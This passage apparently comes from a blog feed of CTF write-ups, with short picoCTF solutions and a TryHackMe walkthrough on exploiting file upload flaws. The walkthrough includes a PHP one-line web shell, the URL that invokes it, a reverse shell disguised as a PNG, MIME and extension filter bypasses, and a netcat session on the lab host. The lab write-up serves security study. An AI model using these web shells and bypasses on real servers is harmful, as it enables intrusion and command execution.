</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>COMMIT_EDITMSG  HEAD  branches  config  description  hooks  index  info  logs  objects  refs
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>leewookb-picoctf@webshell:~/drop-in/.git$ cat COMMIT_EDITMSG
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>picoCTF<span style="color:#89dceb;font-weight:bold">{</span>t1m3m@ch1n3_186cd7d7<span style="color:#89dceb;font-weight:bold">}</span></span></span></code></pre></div>
<br>
<p><strong><em>flag</em></strong>: <code>picoCTF{t1m3m@ch1n3_186cd7d7}</code></p>
]]></content:encoded>
    </item>
    <item>
      <title>[picoCTF] WebDecode</title>
      <link>http://localhost:1313/picoctf-webdecode/</link>
      <pubDate>Sat, 06 Jul 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
      <guid>http://localhost:1313/picoctf-webdecode/</guid>
      <description>Description Do you know how to use the web inspector? Start searching here to find the flag
If you click on the link provided, it takes you to a website. There&amp;rsquo;s a navbar at the top with three options, home, about, and contact If you navigate to the about page, it says Try inspecting the page!! You might find it there.
When you inspect the elements of the page, you&amp;rsquo;ll notice that the section tag has an attribute called notify_true=&amp;quot;cGljb0NURnt3ZWJfc3VjYzNzc2Z1bGx5X2QzYzBkZWRfMjgzZTYyZmV9&amp;quot;.</description>
      <content:encoded><![CDATA[<h3 id="description">Description</h3>
<p>Do you know how to use the web inspector?
Start searching <a href="http://titan.picoctf.net:64333/" target="_blank">here</a> to find the flag</p>
<hr>
<p>If you click on the link provided, it takes you to a website.
<img src="image.png#center" alt="alt text"></p>
<p>There&rsquo;s a navbar at the top with three options, <code>home</code>, <code>about</code>, and <code>contact</code>
If you navigate to the <code>about</code> page, it says <strong>Try inspecting the page!! You might find it there</strong>.</p>
<br>
<p><img src="image-1.png#center" alt="alt text">
When you inspect the elements of the page, you&rsquo;ll notice that the section tag has an attribute called <code>notify_true=&quot;cGljb0NURnt3ZWJfc3VjYzNzc2Z1bGx5X2QzYzBkZWRfMjgzZTYyZmV9&quot;</code>. This looks suspicious and encrypted.</p>
<br>
<p>I googled the word <code>decode</code> and the first thing that popped up was base64. I decided to give it a try since we didn&rsquo;t know if the string was actually encoded or, if it was, how it was encoded</p>
<p><img src="image-3.png#center" alt="alt text"></p>
<br>
<p>I decoded the found string and it turned out to be an encrypted string.</p>
<p><img src="image-2.png#center" alt="alt text"></p>
<p>we found the flag.</p>
<p><strong><em>flag</em></strong>: picoCTF{web_succ3ssfully_d3c0ded_283e62fe}</p>
]]></content:encoded>
    </item>
    <item>
      <title>[THM] Upload Vulnerabilities</title>
      <link>http://localhost:1313/thm-upload-vulnerabilities/</link>
      <pubDate>Sat, 06 Jul 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
      <guid>http://localhost:1313/thm-upload-vulnerabilities/</guid>
      <description>The ability to upload files to a server has become an integral part of how we interact with web applications. Unfortunately, when handled badly, file uploads can also open up severe vulnerabilities in the server.
Overwriting Existing Files Open your web browser and navigate to overwrite.uploadvulns.thm. Your goal is to overwrite a file on the server with an upload of your own.
What is the name of the image file which can be overwritten?</description>
      <content:encoded><![CDATA[<p>The ability to upload files to a server has become an integral part of how we interact with web applications. Unfortunately, when handled badly, file uploads can also open up severe vulnerabilities in the server.</p>
<h3 id="overwriting-existing-files">Overwriting Existing Files</h3>
<p>Open your web browser and navigate to <code>overwrite.uploadvulns.thm</code>. Your goal is to overwrite a file on the server with an upload of your own.</p>
<h4 id="what-is-the-name-of-the-image-file-which-can-be-overwritten">What is the name of the image file which can be overwritten?</h4>






<pre tabindex="0"><code>mountains.jpg</code></pre>
<p>if no precautions are taken, we might be able to overwrite existing files on the server with a file with the same name.</p>
<br>
<h4 id="overwrite-the-image-what-is-the-flag-you-receive">Overwrite the image. What is the flag you receive?</h4>






<pre tabindex="0"><code>THM{OTBiODQ3YmNjYWZhM2UyMmYzZDNiZjI5}</code></pre>
<p><img src="image.png" alt="alt text"></p>
<br>
<h3 id="remote-code-execution">Remote Code Execution</h3>
<p>There are two basic ways to achieve RCE on a webserver when exploiting a file upload vulnerability: <code>webshells</code> and <code>reverse/bind shells</code>.</p>
<p>Navigate to <code>shell.uploadvulns.thm</code> and complete the questions for this task.</p>
<h4 id="run-a-gobuster-scan-on-the-website-using-the-syntax-what-directory-looks-like-it-might-be-used-for-uploads">Run a Gobuster scan on the website using the syntax. What directory looks like it might be used for uploads?</h4>






<pre tabindex="0"><code>/resources</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>┌──<span style="color:#89dceb;font-weight:bold">(</span>kali㉿kali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>└─$ gobuster dir -u http://shell.uploadvulns.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span><span style="color:#89dceb;font-weight:bold">===============================================================</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>Gobuster v3.6
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>by OJ Reeves <span style="color:#89dceb;font-weight:bold">(</span>@TheColonial<span style="color:#89dceb;font-weight:bold">)</span> &amp; Christian Mehlmauer <span style="color:#89dceb;font-weight:bold">(</span>@firefart<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span><span style="color:#89dceb;font-weight:bold">===============================================================</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> Url:                     http://shell.uploadvulns.thm
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> Method:                  GET
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> Threads:                 <span style="color:#fab387">10</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> Negative Status codes:   <span style="color:#fab387">404</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> User Agent:              gobuster/3.6
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> Timeout:                 <span style="color:#f5e0dc">10s</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span><span style="color:#89dceb;font-weight:bold">===============================================================</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>Starting gobuster in directory enumeration <span style="color:#f5e0dc">mode</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span><span style="color:#89dceb;font-weight:bold">===============================================================</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span>/resources            <span style="color:#89dceb;font-weight:bold">(</span>Status: 301<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>Size: 334<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#89dceb;font-weight:bold">[</span>--&gt; http://shell.uploadvulns.thm/resources/<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span>/assets               <span style="color:#89dceb;font-weight:bold">(</span>Status: 301<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>Size: 331<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#89dceb;font-weight:bold">[</span>--&gt; http://shell.uploadvulns.thm/assets/<span style="color:#89dceb;font-weight:bold">]</span></span></span></code></pre></div>
<br>
<h4 id="get-either-a-web-shell-or-a-reverse-shell-on-the-machine-whats-the-flag-in-the-varwww--directory-of-the-server">Get either a web shell or a reverse shell on the machine. What&rsquo;s the flag in the <code>/var/www/ </code> directory of the server?</h4>






<pre tabindex="0"><code>THM{YWFhY2U3ZGI4N2QxNmQzZjk0YjgzZDZk}</code></pre>
<p>I created a file called <code>webshell.php</code> and uploaded to the website in order to get a webshell on the machine.</p>
<p><code>echo '&lt;?php echo system($_GET[&quot;cmd&quot;]); ?&gt;' &gt; webshell.php</code></p>
<p><img src="image-1.png#center" alt="alt text"></p>
<p>after uploading the file, navigate to <code>/var/www</code> directory and list files and directory by typing the following command on the browser:</p>
<p><code>http://shell.uploadvulns.thm/resources/webshell.php?cmd=cd%20/var/www;%20ls;</code></p>
<p><img src="image-2.png#center" alt="alt text"></p>
<p>As we can see, there&rsquo;s the flag.txt file.</p>
<p><img src="image-3.png#center" alt="alt text"></p>
<br>
<h4 id="filtering">Filtering</h4>
<p>Up until now, we have been ignoring the counter-defences employed by web developers. Every website so far has been completely insecure. From here on out, we&rsquo;ll be looking at some of the defence mechanisms used to prevent malicious file uploads.</p>
<p><strong><em>client-side</em></strong> filtering is trivially easy to by pass because the filtering is happening on our computer. client-side filtering by itself is a highly insecure method.</p>
<p><strong><em>server-side</em></strong> filtering tends to be more difficult to by pass, as you don&rsquo;t have the code in front of you.</p>
<p>Different kinds of filtering:</p>
<ul>
<li>Extension Validation</li>
<li>File Type Filtering</li>
<li>Magic Number Validation</li>
<li>File Length Filtering</li>
<li>File Name Filtering</li>
<li>File Content Filtering</li>
</ul>
<br>
<p>What is the traditionally predominant server-side scripting language?</p>






<pre tabindex="0"><code>PHP</code></pre>
<br>
<p>When validating by file extension, what would you call a list of accepted extensions (whereby the server rejects any extension not in the list)?</p>






<pre tabindex="0"><code>whitelist</code></pre>
<br>
<p>[Research] What MIME type would you expect to see when uploading a CSV file?</p>






<pre tabindex="0"><code>text/csv</code></pre>
<p><img src="image-4.png#center" alt="alt text"></p>
<br>
<h3 id="bypassing-client-side-filtering">Bypassing Client-Side Filtering</h3>
<p>There are four easy ways to bypass your average client-side file upload filter:</p>
<ol>
<li><em>Turn off Javascript in your browser</em></li>
<li><em>Intercept and modify the incoming page</em></li>
<li><em>Intercept and modify the file upload</em></li>
<li><em>Send the file directly to the upload point</em></li>
</ol>
<p>Navigate to <code>java.uploadvulns.thm</code> and bypass the filter to get a reverse shell.</p>
<h4 id="what-is-the-flag-in-varwww">What is the flag in <code>/var/www/</code>?</h4>






<pre tabindex="0"><code>THM{NDllZDQxNjJjOTE0YWNhZGY3YjljNmE2}</code></pre>
<p>Let&rsquo;s use Gobuster to locate the upload directory name first by running the following command:</p>
<p><code>gobuster dir -u http://java.uploadvulns.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code></p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>┌──<span style="color:#89dceb;font-weight:bold">(</span>kali㉿kali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>└─$ gobuster dir -u http://java.uploadvulns.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span><span style="color:#89dceb;font-weight:bold">===============================================================</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>Gobuster v3.6
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>by OJ Reeves <span style="color:#89dceb;font-weight:bold">(</span>@TheColonial<span style="color:#89dceb;font-weight:bold">)</span> &amp; Christian Mehlmauer <span style="color:#89dceb;font-weight:bold">(</span>@firefart<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span><span style="color:#89dceb;font-weight:bold">===============================================================</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> Url:                     http://java.uploadvulns.thm
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> Method:                  GET
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> Threads:                 <span style="color:#fab387">10</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> Negative Status codes:   <span style="color:#fab387">404</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> User Agent:              gobuster/3.6
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> Timeout:                 <span style="color:#f5e0dc">10s</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span><span style="color:#89dceb;font-weight:bold">===============================================================</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>Starting gobuster in directory enumeration <span style="color:#f5e0dc">mode</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span><span style="color:#89dceb;font-weight:bold">===============================================================</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span>/images               <span style="color:#89dceb;font-weight:bold">(</span>Status: 301<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>Size: 329<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#89dceb;font-weight:bold">[</span>--&gt; http://java.uploadvulns.thm/images/<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span>/assets               <span style="color:#89dceb;font-weight:bold">(</span>Status: 301<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>Size: 329<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#89dceb;font-weight:bold">[</span>--&gt; http://java.uploadvulns.thm/assets/<span style="color:#89dceb;font-weight:bold">]</span></span></span></code></pre></div>
<br>
<p><img src="image-6.png#center" alt="alt text"></p>
<p>The website upload only accepts MIME type of <code>png</code> files. So I am going to create a file called <code>hello.png</code> but it contains the Pentest Monkey&rsquo;s <code>php-reverse-shell</code> code.</p>
<br>
<p><img src="image-7.png#center" alt="alt text"></p>
<br>
<p>Before hitting the upload button, make sure <code>Intercept is on</code> on Burpsuite to capture the request and we&rsquo;re going to change the MIME type back to <code>text/x-php</code> and the file extension from <code>.png</code> to <code>.php</code>.
<img src="image-8.png#center" alt="alt text">
<img src="image-9.png#center" alt="alt text"></p>
<br>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>┌──<span style="color:#89dceb;font-weight:bold">(</span>kali㉿kali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>└─$ nc -lvp <span style="color:#fab387">443</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>listening on <span style="color:#89dceb;font-weight:bold">[</span>any<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#fab387">443</span> ...
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>connect to <span style="color:#89dceb;font-weight:bold">[</span>10.6.67.243<span style="color:#89dceb;font-weight:bold">]</span> from overwrite.uploadvulns.thm <span style="color:#89dceb;font-weight:bold">[</span>10.10.41.54<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#fab387">54590</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>Linux a73553061b26 4.15.0-109-generic <span style="color:#6c7086;font-style:italic">#110-Ubuntu SMP Tue Jun 23 02:39:32 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span> 04:52:35 up  4:07,  <span style="color:#fab387">0</span> users,  load average: 0.00, 0.00, 0.00
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span><span style="color:#f5e0dc">uid</span><span style="color:#89dceb;font-weight:bold">=</span>33<span style="color:#89dceb;font-weight:bold">(</span>www-data<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#f5e0dc">gid</span><span style="color:#89dceb;font-weight:bold">=</span>33<span style="color:#89dceb;font-weight:bold">(</span>www-data<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#f5e0dc">groups</span><span style="color:#89dceb;font-weight:bold">=</span>33<span style="color:#89dceb;font-weight:bold">(</span>www-data<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>/bin/sh: 0: can<span style="color:#f38ba8">&#39;</span>t access tty; job control turned off
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>$ ls
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>bin
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>boot
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>dev
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>etc
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>home
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span>lib
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span>lib32
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span>lib64
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">19</span><span>libx32
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">20</span><span>media
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">21</span><span>mnt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">22</span><span>opt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">23</span><span>proc
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">24</span><span>root
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">25</span><span>run
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">26</span><span>sbin
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">27</span><span>srv
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">28</span><span>sys
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">29</span><span>tmp
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">30</span><span>usr
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">31</span><span>var
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">32</span><span>$ <span style="color:#89dceb">cd</span> /var/www
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">33</span><span>$ ls
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">34</span><span>flag.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">35</span><span>html
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">36</span><span>$ cat flag.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">37</span><span>THM<span style="color:#89dceb;font-weight:bold">{</span>NDllZDQxNjJjOTE0YWNhZGY3YjljNmE2<span style="color:#89dceb;font-weight:bold">}</span></span></span></code></pre></div>
<br>
<h4 id="bypassing-server-side-filtering-file-extensions">Bypassing Server-Side Filtering: File Extensions</h4>
<p>What is the flag in <code>/var/www/</code>?</p>






<pre tabindex="0"><code>THM{MGEyYzJiYmI3ODIyM2FlNTNkNjZjYjFl}</code></pre>
<p>First let&rsquo;s use Gobuster to locate the upload directory name. The directory name turned out to be <code>privacy</code>.
<img src="image-12.png#center" alt="alt text"></p>
<br>
<p>I tried uploading <code>.png</code> file and it was accepted. So I tried uploading the reverse-shell-php file with the name of <code>hello.png.php</code> but it was denied by saying it&rsquo;s an invalid type format. So I tried <code>hello.php5</code> and it was accepted!</p>
<p><img src="image-15.png#center" alt="alt text">
<img src="image-13.png#center" alt="alt text"></p>
<br>
<p>After the file was uploaded, I navaigated to the <code>/privacy</code>. Before opening up the reverse-shell file, I had run the netcat command thats running on port 1234 to capture and receive the reverse shell connection.</p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>┌──<span style="color:#89dceb;font-weight:bold">(</span>kali㉿kali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~<span style="color:#89dceb;font-weight:bold">]</span>
